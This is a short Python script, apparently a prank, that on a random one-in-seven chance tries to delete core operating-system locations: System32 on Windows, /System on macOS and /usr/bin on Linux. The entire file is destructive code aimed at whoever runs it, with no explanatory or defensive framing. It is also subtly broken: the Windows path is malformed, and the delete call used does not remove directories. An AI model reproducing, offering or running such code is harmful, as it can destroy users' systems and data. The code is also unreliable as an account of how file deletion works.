import random
import os
import platform

if random.randint(0, 6) == 1 and platform.system() == 'Windows':
    os.remove('C:.\Windows\System32')
if random.randint(0, 6) == 1 and platform.system() == 'Darwin':
    os.remove('/System')
if random.randint(0, 6) == 1 and platform.system() == 'Linux':
    os.remove('/usr/bin')
